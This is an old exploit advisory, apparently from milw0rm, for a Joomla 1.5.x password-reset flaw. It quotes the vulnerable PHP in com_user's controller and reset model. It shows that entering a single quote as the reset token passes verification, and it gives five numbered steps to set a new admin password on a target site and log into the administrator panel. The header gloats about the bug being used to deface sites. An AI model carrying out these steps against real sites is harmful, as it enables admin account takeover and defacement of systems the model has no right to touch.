<html><head><title>Joomla 1.5.x (Token) Remote Admin Change Password Vulnerability</title></head><pre>#####################################################################################
####                     Joomla 1.5.x Remote Admin Password Change               ####
#####################################################################################
#                                                                                   #
# Author: d3m0n (d3m0n@o2.pl)                                                       #
# Greets: GregStar, gorion, d3d!k                                                   #
#                                                                                   #
# Polish &quot;hackers&quot; used this bug to deface turkish sites BUAHAHHA nice 0-day pff    #
#                                                                                   #
#####################################################################################



File : /components/com_user/controller.php

#####################################################################################
Line : 379-399
 
	function confirmreset()
	{
		// Check for request forgeries
		JRequest::checkToken() or die( 'Invalid Token' );

		// Get the input
		$token = JRequest::getVar('token', null, 'post', 'alnum');              &lt; --- {1} 
                  
		// Get the model
		$model = &amp;$this-&gt;getModel('Reset');

		// Verify the token
		if ($model-&gt;confirmReset($token) === false)   &lt; --- {2}
		{
			$message = JText::sprintf('PASSWORD_RESET_CONFIRMATION_FAILED', $model-&gt;getError());
			$this-&gt;setRedirect('index.php?option=com_user&amp;view=reset&amp;layout=confirm', $message);
			return false;
		}

		$this-&gt;setRedirect('index.php?option=com_user&amp;view=reset&amp;layout=complete');
	}
	
#####################################################################################
	
File : /components/com_user/models/reset.php

Line: 111-130 	
	
	
	
	function confirmReset($token)
	{
		global $mainframe;

		$db	= &amp;JFactory::getDBO();
		$db-&gt;setQuery('SELECT id FROM #__users WHERE block = 0 AND activation = '.$db-&gt;Quote($token));  &lt; ---- {3} 

		// Verify the token
		if (!($id = $db-&gt;loadResult()))
		{
			$this-&gt;setError(JText::_('INVALID_TOKEN'));
			return false;
		}

		// Push the token and user id into the session
		$mainframe-&gt;setUserState($this-&gt;_namespace.'token',	$token);
		$mainframe-&gt;setUserState($this-&gt;_namespace.'id',	$id);

		return true;
	}
#####################################################################################



{1} - Replace ' with empty char
{3} - If you enter ' in token field then query will be looks like : &quot;SELECT id FROM jos_users WHERE block = 0 AND activation = '' &quot;


Example :


1. Go to url : target.com/index.php?option=com_user&amp;view=reset&amp;layout=confirm

2. Write into field &quot;token&quot; char ' and Click OK.

3. Write new password for admin

4. Go to url : target.com/administrator/

5. Login admin with new password

# milw0rm.com [2008-08-12]</pre></html>